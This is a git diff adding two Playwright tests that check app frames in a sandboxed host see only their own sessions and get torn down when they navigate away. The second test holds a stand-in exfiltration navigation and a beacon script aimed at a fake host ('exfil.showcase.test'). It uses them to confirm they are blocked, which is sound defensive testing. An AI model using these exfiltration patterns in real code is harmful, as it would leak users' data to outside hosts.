@@ -21,7 +21,7 @@ import { join } from "node:path";
 import type { Frame, FrameLocator, Page } from "@playwright/test";
 import { type Backend, connect, expect, test } from "@harnix/testkit";
 
-import { SHOWCASE_ID, appsTools, showcasePackage, startApps, variant } from "../api/apps-host";
+import { SHOWCASE_CHATS, SHOWCASE_ID, appsTools, showcasePackage, startApps, variant } from "../api/apps-host";
 import { MOCK_PUBLISHER, STORE_FIXTURE } from "../api/apps-store";
 import { open, watchConsole } from "./page";
 
@@ -125,6 +125,87 @@ test.describe("an application in isolated frames", () => {
     await page.evaluate(() => (window as any).harnix.host.settings.open("diagnostics"));
     await page.locator('[data-section="diagnostics"]').click();
     await expect(page.locator("#modal")).toContainText("harnix.apps.list");
+  });
+
+  test("what its hub lists reaches its own space's sessions, and no other", TAGS, async ({ page }) => {
+    // One in its second space (its board's left column counts the first), and one elsewhere.
+    const api = await connect(backend);
+    let own = "";
+    let other = "";
+    try {
+      own = (await api.call("session.create", { space: SHOWCASE_CHATS, project_root: api.project })).session_id;
+      other = (await api.call("session.create", { project_root: api.project })).session_id;
+    } finally {
+      api.close();
+    }
+    await open(page, backend.url);
+    await board(page);
+    const frame = await frameHandle(page, "space");
+    const ask = (method: string, params: unknown) =>
+      frame.evaluate(
+        async ([m, p]) => {
+          try {
+            return { ok: await (window as any).showcaseBridge.call(m, p) };
+          } catch (e: any) {
+            return { code: e.code, message: e.message };
+          }
+        },
+        [method, params] as const,
+      );
+    // The session list is its own spaces': the frame's own when it names none.
+    const listed = JSON.stringify(await ask("harnix.sessions", { space: SHOWCASE_CHATS }));
+    expect(listed).toContain(own);
+    expect(listed).not.toContain(other);
+    expect(JSON.stringify(await ask("harnix.sessions", {}))).not.toContain(other);
+    expect(await ask("harnix.sessions", { space: "example.elsewhere" })).toMatchObject({ code: "refused" });
+    // A session of its own space it may read; one elsewhere it is refused, though the page could.
+    expect((await ask("session.get", { instance: "system", session_id: own })).ok).toBeTruthy();
+    expect(await ask("session.get", { instance: "system", session_id: other })).toMatchObject({ code: "refused" });
+    const noted = await page.evaluate(() => (window as any).harnix.app.registry.refusals().filter((r: any) => r.point === "bridge"));
+    expect(noted.map((r: any) => r.id)).toEqual(expect.arrayContaining(["harnix.sessions", "session.get"]));
+  });
+
+  test("a page that navigates itself away is emptied at once, and on the record", TAGS, async ({ page }) => {
+    const reached: string[] = [];
+    await page.route("https://exfil.showcase.test/**", (route) => {
+      reached.push(route.request().url());
+      return route.fulfill({
+        status: 200,
+        contentType: "text/html",
+        body: "<p>elsewhere</p><script>setInterval(() => { new Image().src = 'https://exfil.showcase.test/beacon?' + Date.now(); }, 50)</script>",
+      });
+    });
+    await page.route("https://exfil.showcase.test/beacon**", (route) => {
+      reached.push(route.request().url());
+      return route.fulfill({ status: 204 });
+    });
+    await open(page, backend.url);
+    await board(page);
+    const surface = surfaceOf(page, "space");
+    // The frame's `src`, as the shell sets it from here on.
+    await page.evaluate((app) => {
+      const iframe = document.querySelector(`iframe.hx-frame[data-app="${app}"][data-point="space"]`)!;
+      const srcs: (string | null)[] = ((window as any).srcs = []);
+      new MutationObserver(() => srcs.push(iframe.getAttribute("src"))).observe(iframe, { attributes: true, attributeFilter: ["src"] });
+    }, SHOWCASE_ID);
+    const frame = await frameHandle(page, "space");
+    // Its context goes with the navigation, so the evaluation itself may not come back.
+    await frame.evaluate(() => void (location.href = `https://exfil.showcase.test/?d=${encodeURIComponent("the board")}`)).catch(() => undefined);
+    await expect(surface).toHaveAttribute("data-state", "failed", { timeout: 10_000 });
+    await expect(surface.getByTestId("surface-reason")).toContainText(/navigated|跳转/);
+    expect(await page.evaluate(() => (window as any).srcs)).toContain("about:blank");
+    await expect(page.locator(`iframe.hx-frame[data-app="${SHOWCASE_ID}"][data-point="space"]`)).toHaveCount(0);
+    // Where it went was never reached: the page's own `frame-src 'self'` keeps a frame's navigation
+    // to this origin, so what it carried in the address goes nowhere else.
+    await page.waitForTimeout(500);
+    expect(reached, "the frame reached another host").toEqual([]);
+    // On the record: the Apps tab's count of its interface's failures, and Diagnostics.
+    const failures = await page.evaluate(() => (window as any).harnix.app.registry.refusals().filter((r: any) => r.point === "surface" && r.owner === "example.showcase"));
+    expect(failures.length).toBeGreaterThanOrEqual(1);
+    await toSpace(page, "system");
+    await page.locator('[data-testid="system-console"] [data-tab="apps"]').click();
+    const row = page.locator(`[data-testid="system-app"][data-app="${SHOWCASE_ID}"]`);
+    await expect(row.locator('[data-field="surfaces"]')).toHaveText(/ · 1$/, { timeout: 15_000 });
   });
 
   test("it cannot read the page's token, storage or cookies, nor reach the network", TAGS, async ({ page }) => {
